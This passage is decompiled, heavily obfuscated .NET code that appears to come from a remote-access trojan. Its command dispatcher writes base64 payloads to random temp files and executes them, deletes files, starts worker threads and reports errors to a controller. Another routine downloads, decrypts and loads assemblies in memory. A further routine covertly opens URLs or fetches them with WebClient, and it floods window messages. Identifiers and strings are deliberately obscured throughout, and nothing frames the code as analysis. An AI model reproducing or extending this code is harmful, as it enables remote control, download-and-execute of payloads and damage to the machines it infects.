													return;
												}
												goto IL_1ef2;
											}
											num2 = 19292;
											if (((num30 * 2048) & -1589723136) != (-1589723136 & (num30 << 11)))
											{
												goto case 33;
											}
											global::___________________.___________(array[1]);
											return;
										}
										num2 = -22176;
										if (sizeof(int) + 16526 != 16530)
										{
											goto case 59;
										}
										global::___________________._______();
										return;
									}
									int num31 = global::______________________._______;
									if ((num31 * 6 + 58 * num31) * -729808896 == -1273)
									{
										num = (nint)Type.EmptyTypes.LongLength + -1969632788;
										continue;
									}
									if (58 * num15 + 6 * num15 - -1610612736 == (int)((uint)(num15 * 83 + 173 * num15) >> 2))
									{
										num = (((4 & (num9 * 4 + num9 * 4)) != ((4 * (num19 & (num19 << 2))) & 4)) ? ((nint)Type.EmptyTypes.LongLength + 1173411736) : (((int)((uint)num31 / 8u * 117 + (uint)num31 / 8u * 139) - -134217728 != num31 * 32) ? ((nint)Type.EmptyTypes.LongLength + -480641725) : ((nint)Type.EmptyTypes.LongLength + 1340095669)));
										continue;
									}
									if ((0xFFFFDE5Cu ^ ((uint)num9 % 1988559458u)) == 0)
									{
										num = (nint)Type.EmptyTypes.LongLength + 1839146823;
										continue;
									}
								}
								else
								{
									num2 = -13624;
									if (((num32 * 1677568) & 0x4C) == 0)
									{
										_________________________________________________________________________________ ________________________________________________________________________________2 = new _________________________________________________________________________________();
										Thread thread10 = new Thread(________________________________________________________________________________2.____________);
										if (num2 != -8305)
										{
											thread10.Start();
										}
										return;
									}
								}
								goto case 55;
							}
							if (((0x1B8E & num12) << 28) * (num12 & 0x6D6) != -8552)
							{
								num = (nint)Type.EmptyTypes.LongLength + 37;
								continue;
							}
							if (-1744830464 + num7 != num7 && (0x40D ^ (num33 * 1972189654)) == 0)
							{
								num = (nint)Type.EmptyTypes.LongLength + -1655772959;
								continue;
							}
						}
					}
					goto default;
				case 9:
					___________________________________________________________________2 = new ____________________________________________________________________();
					___________________________________________________________________2._ = array[1];
					if ((0x65ECu ^ (uint)(num6 * -536870912)) != 0)
					{
						num = (nint)Type.EmptyTypes.LongLength + 2;
						continue;
					}
					if ((((uint)num2 / 8388608u) ^ 0x1E74) == 0)
					{
						num = sizeof(short) + 1737170524;
						continue;
					}
					num18 = -1062840359;
					goto default;
				case 35:
				{
					Random random = new Random();
					string tempPath = Path.GetTempPath();
					num5 = random.Next(10000, 90000);
					text = tempPath + num5 + _003CModule_003E.______<string>(4118365827u);
					if (num2 != 17737)
					{
						goto IL_074b;
					}
					goto case 55;
				}
				case 22:
					_________________(array[1], array[2], Convert.ToInt32(array[3]), Convert.ToInt32(array[4]));
					num = sizeof(uint) + -1;
					continue;
				case 1:
					_003CModule_003E._____________ = 480802764;
					thread6 = new Thread(______________________________);
					num = (nint)Type.EmptyTypes.LongLength + 33;
					continue;
				case 3:
					return;
				case 6:
					return;
				case 8:
					return;
				case 10:
					global::______________________.________(______________________________________________________________._______________________ + _003CModule_003E.____<string>(1457469466u));
					return;
				case 12:
					return;
				case 16:
				{
					__________________________________ _________________________________ = new __________________________________();
					Thread thread5 = new Thread(_________________________________._______);
					if (num2 != -6190)
					{
						goto case 65;
					}
					thread5.Start();
					return;
				}
				case 17:
					___________(_003CModule_003E._______<string>(2150552932u) + global::___________________._____() + _003CModule_003E.____<string>(3008796200u));
					num4 = global::______________________._______;
					return;
				case 20:
					return;
				case 23:
					File.WriteAllBytes(array[1], bytes);
					return;
				case 24:
					return;
				case 25:
					global::____________________.___(array[1]);
					return;
				case 26:
					______________________________________________._ = false;
					return;
				case 28:
					__________________(array[1], array[2], bool_0: false);
					if (num2 != 28070)
					{
						return;
					}
					goto case 60;
				case 36:
					return;
				case 37:
					_________________________________________________.___________(array[1]);
					return;
				case 38:
					global::____________________._________(array[1]);
					return;
				case 39:
					return;
				case 40:
					global::___________________._();
					return;
				case 43:
					File.Delete(global::______________________.___ + array[1]);
					return;
				case 4:
					thread9.Start();
					return;
				case 21:
					_______________________________________________.__(array[1]);
					return;
				case 18:
					global::____________________.__(array[1], array[2], bool_0: false);
					return;
				case 34:
					global::____________________.____(array[1]);
					return;
				case 7:
					global::___________________.____(array[1]);
					return;
				case 45:
					thread4.Start();
					return;
				case 46:
					return;
				case 48:
					return;
				case 50:
					___________________________________ = new ____________________________________();
					___________________________________._ = array[1];
					num2 = 25929;
					goto case 47;
				case 47:
				{
					Thread thread2 = new Thread(___________________________________._);
					thread2.Start();
					if (num2 != -20737 || (uint)(num3 + num3) / 7338u == 2235061062u)
					{
						return;
					}
					goto case 32;
				}
				case 32:
					_________________________________________________________________._____(array[1]);
					return;
				case 54:
					__.Close();
					return;
				case 55:
					Process.Start(array[1]);
					return;
				case 57:
					return;
				case 59:
				{
					string text8 = _____________________________________________________________________.____(array[1]);
					if (Operators.CompareString(text8, _003CModule_003E.____<string>(372314799u), false) == 0)
					{
						return;
					}
					num34 = num2;
					num2 = 14451;
					if (43 * num36 + 85 * num36 == 974290426 || num34 != 31326)
					{
						___________(_003CModule_003E._______<string>(987635703u) + text8 + _003CModule_003E.______<string>(861631917u));
						if (num2 != 21896 || ((~((0x6FB545D8 & num6) - 1875) ^ 0x14BD) & 3) != 3)
						{
							return;
						}
						goto IL_1fc2;
					}
					goto IL_1fee;
				}
				case 60:
					__________________________________________________________________._____(_003CModule_003E._______<string>(3848501920u), _003CModule_003E._____<string>(142639785u));
					______________(_003CModule_003E._____<string>(3623611337u), _003CModule_003E._______<string>(3967402460u));
					if (num2 != 9665)
					{
						return;
					}
					goto case 49;
				case 27:
					_____________________________________________________________________________.____________();
					return;
				case 63:
					global::____________________.__________(array[1]);
					return;
				case 65:
					global::____________________.________();
					return;
				case 66:
					thread.Start();
					return;
				case 41:
					global::______________________.______();
					return;
				case 11:
					return;
				case 33:
					thread6.Start();
					return;
				case 29:
					return;
				case 49:
					_________________________________________________._______(Convert.ToInt32(array[1]));
					return;
				case 62:
					return;
				case 14:
					global::______________________.________(array[1]);
					return;
				case 15:
					return;
				case 13:
				{
					string[] array3 = Strings.Split(string_0, _003CModule_003E.______<string>(2507809651u), -1, (CompareMethod)0);
					File.WriteAllText(text3, array3[1]);
					Process.Start(text3);
					______________(_003CModule_003E.____<string>(3395602991u), _003CModule_003E._______<string>(3274729611u) + text3);
					return;
				}
				case 70:
					text6 = _003CModule_003E.______<string>(755090443u);
					goto IL_22e8;
				case 31:
					return;
				case 72:
					return;
				case 73:
					break;
				case 74:
					return;
					IL_2230:
					random2 = new Random();
					text3 = Path.GetTempPath() + random2.Next(1000, 9000) + _003CModule_003E.____<string>(2682857905u) + array[1];
					goto case 13;
					IL_214e:
					______________________________________________._(array[1]);
					return;
					IL_094c:
					bytes2 = Convert.FromBase64String(array2[1]);
					File.WriteAllBytes(text, bytes2);
					num = (nint)Type.EmptyTypes.LongLength + 53;
					continue;
					IL_1ef2:
					global::__________________._ += array[1];
					return;
					IL_1c9c:
					global::____________________._____(array[1], array[2]);
					if (num2 != -651)
					{
						goto case 63;
					}
					return;
					IL_17db:
					global::____________________.__(array[1], array[2], bool_0: true);
					num = sizeof(double) + 28;
					continue;
					IL_082f:
					______________________________________________________________.________________________ = array[1];
					__________________________________________________________________._____(_003CModule_003E._______<string>(1334981879u), array[1]);
					num = (nint)Type.EmptyTypes.LongLength + 24;
					continue;
					IL_074b:
					if (File.Exists(text))
					{
						File.Delete(text);
					}
					array2 = Strings.Split(string_0, _003CModule_003E.______<string>(1992654500u), -1, (CompareMethod)0);
					num2 = -4608;
					if ((((-(0x3BB4C620 & num5) ^ 0x17E3) == 0) ? (sizeof(Guid) + -1828326325) : ((nint)Type.EmptyTypes.LongLength + -30838)) != -26334)
					{
						goto IL_094c;
					}
					return;
					IL_21fa:
					_________________________________________________________________._ = array[1];
					return;
					IL_1fc2:
					___________(_003CModule_003E.____<string>(2959865172u) + global::___________________.______(array[1]) + _003CModule_003E.___<string>(2677394803u));
					return;
					IL_22e8:
					Thread.Sleep(250);
					___________(_003CModule_003E.____<string>(547721682u) + text6 + _003CModule_003E._____<string>(1052623516u));
					return;
					IL_1fee:
					global::____________________.___________(array[1]);
					return;
					IL_09dd:
					if (Operators.CompareString(______________________________________________________________._________________, _003CModule_003E.___<string>(3645872316u), false) != 0)
					{
						num2 = sizeof(byte) + -26221;
						num = sizeof(float) + 56;
						continue;
					}
					______________(_003CModule_003E.______<string>(2655866516u), _003CModule_003E.___<string>(736611324u));
					return;
					IL_2314:
					thread8.Start();
					return;
					IL_050e:
					num2 = 18041;
					if (Operators.CompareString(text2, _003CModule_003E._____<string>(4227175506u), false) == 0)
					{
						num34 = num2;
						num2 = -10388;
						int num47 = _003CModule_003E._________________;
						if (~(239968 * num47 * 1024) == num47 * -818380800 || num34 != -9253)
						{
							_________________________________________________._______(Convert.ToInt32(array[1]), bool_0: true);
							return;
						}
					}
					else
					{
						if (Operators.CompareString(text2, _003CModule_003E.______<string>(2020288334u), false) == 0)
						{
							num2 = (int)((nint)Type.EmptyTypes.LongLength + -31430);
							if (((num26 * -3902) | -2) != -2)
							{
								num = (nint)Type.EmptyTypes.LongLength + -1988886178;
							}
							else if (~((0 - (uint)num30 / 32u) * 32768) == (uint)(495 * num30 + num30 * 529))
							{
								num48 = global::___________._;
								num = (((((uint)num48 / 12083u / 734276768u) & 0x2520) == 0) ? (sizeof(double) + 1985526931) : (sizeof(byte) + -1445419117));
							}
							else
							{
								num = (nint)Type.EmptyTypes.LongLength + 68;
							}
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E.____<string>(2573878295u), false) != 0)
						{
							if (Operators.CompareString(text2, _003CModule_003E.______<string>(601139745u), false) != 0)
							{
								goto case 51;
							}
							num2 = 18882;
							if ((((uint)num48 % 8388608u != 3326501867u) ? (sizeof(double) + 15559) : (sizeof(long) + 1539912851)) == 15567)
							{
								goto IL_09dd;
							}
							goto IL_2230;
						}
						num2 = 14084;
						if ((0xFFFFE187u | (816447488 * ((uint)num7 % 5515u))) != 4294959495u)
						{
							goto case 14;
						}
					}
					text = array[1];
					if (Operators.CompareString(text, _003CModule_003E._____<string>(3176966931u), false) == 0)
					{
						num2 = sizeof(float) + 30911;
						int num49 = _003CModule_003E.______________;
						if ((((uint)num49 % 32u / 16u) & 1) == (((uint)num49 >> 4) & 1))
						{
							num = (nint)Type.EmptyTypes.LongLength + 35;
							continue;
						}
						goto default;
					}
					goto IL_074b;
				}
				break;
			}
			thread7.Start();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________(_003CModule_003E._____<string>(2571642080u), _003CModule_003E._______<string>(4225233202u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ______________________(string string_0)
	{
		try
		{
			if (14807 == (nint)Type.EmptyTypes.LongLength + 14807)
			{
				string path = global::______________________.____ + ______________________________________________________________._______________________ + _003CModule_003E.___<string>(697590686u);
				if (!File.Exists(path))
				{
					byte[] byte_2 = default(byte[]);
					if ((nint)Type.EmptyTypes.LongLength + 15368 != -6984)
					{
						WebClient webClient = new WebClient();
						byte[] byte_ = webClient.DownloadData(string_0);
						byte_2 = ___________________________________________________________________._______(byte_, _003CModule_003E.____<string>(251397721u));
					}
					byte[] array = ________________________________________________________________________________.______(byte_2);
					if (array.Length != 82438)
					{
						string string_ = _003CModule_003E.____<string>(1187660804u);
						string string_2 = _003CModule_003E.______<string>(3786824459u);
						global::___________._ = -1932913121;
						______________(string_, string_2);
						return;
					}
					File.WriteAllBytes(path, ___________________________________________________________________._______(array, _003CModule_003E.__________(sizeof(short) + 29789, (int)((nint)Type.EmptyTypes.LongLength + 29140), (int)((nint)Type.EmptyTypes.LongLength + 185))));
				}
			}
			_______________________________________________._ = true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________(_003CModule_003E._______<string>(2357608790u), _003CModule_003E._______<string>(1592812621u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	private unsafe static Assembly _______________________(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Assembly result = default(Assembly);
		try
		{
			int num = _003CModule_003E._________________;
			AssemblyName assemblyName;
			Array array = default(Array);
			nint num5;
			if (num * 618624 != -1581)
			{
				assemblyName = new AssemblyName(resolveEventArgs_0.Name);
				if (assemblyName.Name!.Contains(_003CModule_003E.____<string>(2102967365u)))
				{
					if ((nint)Type.EmptyTypes.LongLength + 30647 != 30647)
					{
						return result;
					}
				}
				else
				{
					if (!_______________________________________________._)
					{
						return result;
					}
					byte[] byte_ = File.ReadAllBytes(global::______________________.____ + ______________________________________________________________._______________________ + _003CModule_003E.___<string>(697590686u));
					int num2 = default(int);
					nint num3;
					if (2077229056 * num2 * (int)((uint)num2 % 8192u) != -7802)
					{
						num3 = 22952;
					}
					else if (3473 + ((num2 - 9987) | (67 * num2 + num2 * 61)) == ~num2)
					{
						if ((-3 | (num2 * 3 + num2 - 2636)) == -3)
						{
							if (num2 * 779 + num2 * 245 == -1746265770)
							{
								int num4 = _003CModule_003E._______________;
								num3 = (((-(0x3FFFFBA8 & num4) ^ 0x1C3C) == 0) ? (-1950083533) : ((nint)Type.EmptyTypes.LongLength + -1359128622));
							}
							else
							{
								num3 = (nint)Type.EmptyTypes.LongLength + -1729275948;
							}
						}
						else
						{
							num3 = (nint)Type.EmptyTypes.LongLength + -1225301400;
						}
					}
					else
					{
						num3 = (nint)Type.EmptyTypes.LongLength + 1026787821;
					}
					array = global::_____________________________.____________(___________________________________________________________________._______(byte_, _003CModule_003E.__________((int)num3, (int)((nint)Type.EmptyTypes.LongLength + 24312), sizeof(short) + 197)), _003CModule_003E._____<string>(3643921929u));
					if ((nint)Type.EmptyTypes.LongLength + -22118 != 12434)
					{
						_ = (byte[])NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null);
						num5 = sizeof(int) + -2;
						goto IL_0241;
					}
				}
				byte[] byte_2 = ___________________________________________________________________._______(__________________________________________________________________________.______, _003CModule_003E.___<string>(2290872062u));
				result = Assembly.Load(________________________________________________________________________________.______(byte_2));
				num5 = (nint)Type.EmptyTypes.LongLength + 1;
				goto IL_0241;
			}
			return result;
			IL_0241:
			while (true)
			{
				switch (num5)
				{
				case 2:
					_ = (byte[])NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
					num5 = sizeof(ushort) + -2;
					break;
				case 0:
				{
					if (assemblyName.Name!.ToLower().Contains(_003CModule_003E.____<string>(1033029822u)))
					{
						num5 = (nint)Type.EmptyTypes.LongLength + 3;
						break;
					}
					Type typeFromHandle2 = typeof(Assembly);
					string text2 = _003CModule_003E.______<string>(131364567u);
					object[] array7 = new object[1];
					object[] array10 = array7;
					Array array11 = array;
					object[] array12 = new object[1];
					object[] array13 = array12;
					int num2 = 1;
					array13[0] = 1;
					array10[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array11, array12, (string[])null));
					object[] array2 = array7;
					object[] array14 = array2;
					bool[] array9 = new bool[1] { true };
					object obj2 = NewLateBinding.LateGet((object)null, typeFromHandle2, text2, array14, (string[])null, (Type[])null, array9);
					if (array9[0])
					{
						NewLateBinding.LateIndexSetComplex((object)array, new object[2]
						{
							num2,
							RuntimeHelpers.GetObjectValue(array2[0])
						}, (string[])null, true, false);
					}
					result = (Assembly)obj2;
					return result;
				}
				case 3:
				{
					Type typeFromHandle = typeof(Assembly);
					string text = _003CModule_003E.___<string>(2613430401u);
					object[] array2 = new object[1];
					object[] array3 = array2;
					Array array4 = array;
					object[] array5 = new object[1];
					object[] array6 = array5;
					int num2 = 0;
					array6[0] = 0;
					array3[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array4, array5, (string[])null));
					object[] array7 = array2;
					object[] array8 = array7;
					bool[] array9 = new bool[1] { true };
					object obj = NewLateBinding.LateGet((object)null, typeFromHandle, text, array8, (string[])null, (Type[])null, array9);
					if (array9[0])
					{
						NewLateBinding.LateIndexSetComplex((object)array, new object[2]
						{
							num2,
							RuntimeHelpers.GetObjectValue(array7[0])
						}, (string[])null, true, false);
					}
					result = (Assembly)obj;
					return result;
				}
				default:
					return result;
				case 1:
					return result;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public unsafe static void ________________________(string string_0, string string_1, string string_2)
	{
		//IL_0361: Unknown result type (might be due to invalid IL or missing references)
		//IL_0367: Expected O, but got Unknown
		try
		{
			int num = global::______________________._______;
			if ((0x147D | (-926941184 * num * 2013265920)) != 5245)
			{
				goto IL_03b7;
			}
			nint num2;
			int num4 = default(int);
			int num3 = default(int);
			if (Operators.CompareString(string_1, _003CModule_003E._______<string>(587536482u), false) == 0)
			{
				num2 = sizeof(float) + -2;
			}
			else
			{
				if (Operators.CompareString(string_1, _003CModule_003E._______<string>(2817178952u), false) != 0)
				{
					if (Operators.CompareString(string_1, _003CModule_003E._______<string>(642309030u), false) == 0)
					{
						num3 = 26953;
						nint num5;
						if ((0x34 & (((uint)(num4 * 1048576) >> 3) ^ (uint)(-(2204416 * num4)))) == 0)
						{
							num5 = (nint)Type.EmptyTypes.LongLength + -31435;
						}
						else
						{
							int num6 = _003CModule_003E._______________;
							num5 = ((num6 * 290 + 1758 * num6 == -5240) ? ((nint)Type.EmptyTypes.LongLength + -1115912675) : (sizeof(short) + -1444927161));
						}
						if (num5 != 28852)
						{
							goto IL_0202;
						}
					}
					else
					{
						if (Operators.CompareString(string_1, _003CModule_003E.___<string>(3884153438u), false) != 0)
						{
							goto IL_0145;
						}
						num3 = -26473;
						if ((0xCFFFFFFFu | (((uint)num / 16u) ^ 0x56C)) == 3489660927u)
						{
							goto IL_03b7;
						}
					}
					goto IL_0386;
				}
				num3 = (int)((nint)Type.EmptyTypes.LongLength + 30416);
				num2 = (nint)Type.EmptyTypes.LongLength + 0;
			}
			goto IL_034e;
			IL_0361:
			WebBrowser val = new WebBrowser();
			val.set_ScriptErrorsSuppressed(true);
			val.Navigate(string_0);
			if (num3 == 30416)
			{
			}
			goto IL_0145;
			IL_0386:
			Process.Start(string_0);
			goto IL_0145;
			IL_0202:
			object? objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(_003CModule_003E.____<string>(2884599466u), _003CModule_003E.__________(sizeof(int) + 10488, sizeof(ushort) + 11883, (int)((nint)Type.EmptyTypes.LongLength + 114))));
			__________________________________.____________ = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 36861), (int)((nint)Type.EmptyTypes.LongLength + 38415), (int)((nint)Type.EmptyTypes.LongLength + 0));
			object obj = objectValue;
			num3 = -20261;
			int num7 = default(int);
			if (((7 * num7 + num7) | -5) != -5)
			{
				goto IL_02ea;
			}
			string text = _003CModule_003E._____<string>(3400289134u);
			object[] array = new object[1] { string_0 };
			object[] array2 = array;
			bool[] array3 = new bool[1] { true };
			NewLateBinding.LateCall(obj, (Type)null, text, array2, (string[])null, (Type[])null, array3, true);
			num4 = num3;
			num3 = -8397;
			int num8 = default(int);
			if (num4 == -20261)
			{
				num8 = _003CModule_003E._______________;
				if ((2 & (3 * num8 + num8) & num8) == (int)(((uint)(-(num8 << 7)) >> 2) & 2))
				{
					goto IL_02ea;
				}
			}
			goto IL_0361;
			IL_034e:
			switch (num2)
			{
			case 1:
				break;
			case 0:
				goto IL_0361;
			default:
				goto IL_0386;
			}
			goto IL_0145;
			IL_0145:
			______________(_003CModule_003E.___<string>(982404538u), _003CModule_003E._______<string>(2195310649u) + string_0);
			num3 = -18512;
			nint num10;
			if (253820928 * num8 != 1686 || (0x77000000 & ((uint)num8 / 562u)) == 0)
			{
				int num9 = _003CModule_003E._____________;
				num10 = ((num9 + -4933 == (int)((uint)num9 % 2u)) ? (sizeof(double) + -2146986324) : (((0x5E50 ^ ((num | -7605) * 385024)) == 0) ? ((nint)Type.EmptyTypes.LongLength + -401140455) : ((nint)Type.EmptyTypes.LongLength + -26473)));
			}
			else
			{
				num10 = (nint)Type.EmptyTypes.LongLength + 1329576031;
			}
			if (num10 == -2794)
			{
				goto IL_0202;
			}
			if (Operators.CompareString(string_2, _003CModule_003E.____<string>(744724380u), false) != 0)
			{
				return;
			}
			if (num3 != -18512)
			{
				goto IL_03b7;
			}
			while (num7 < 100)
			{
				num7++;
				_____________________________________________________________ ____________________________________________________________2 = new _____________________________________________________________();
				SendMessageW(((Control)____________________________________________________________2).get_Handle(), 793, ((Control)____________________________________________________________2).get_Handle(), (IntPtr)589824);
			}
			return;
			IL_03b7:
			WebClient webClient = new WebClient();
			webClient.DownloadString(string_0);
			goto IL_0145;
			IL_02ea:
			if (array3[0])
			{
				string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				if (num3 != -8397)
				{
					goto IL_03b7;
				}
			}
			string text2 = _003CModule_003E.______<string>(770871971u);
			array = new object[1] { false };
			NewLateBinding.LateSet(obj, (Type)null, text2, array, (string[])null, (Type[])null);
			num2 = (nint)Type.EmptyTypes.LongLength + 1;
			goto IL_034e;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________(_003CModule_003E.______<string>(3474929201u), _003CModule_003E.______<string>(3731556791u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll")]
	public static extern IntPtr SendMessageW(IntPtr intptr_0, int int_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("kernel32.dll")]
	public static extern uint SetThreadExecutionState(uint uint_0);

	[SpecialName]
	[DebuggerStepThrough]
	private static void ___________________________(object sender, ElapsedEventArgs e)
	{
		_____________________________________________________________________________._();
	}

	[SpecialName]
	[DebuggerStepThrough]
	private static void ____________________________(object sender, ElapsedEventArgs e)
	{
		________();
	}

	[SpecialName]
	[DebuggerStepThrough]
	private static void _____________________________(object sender, UnhandledExceptionEventArgs e)
	{
		____________________();
	}

	[SpecialName]
	[DebuggerStepThrough]
	private static void ______________________________()
	{
		_________________________________________________.___();
	}
}
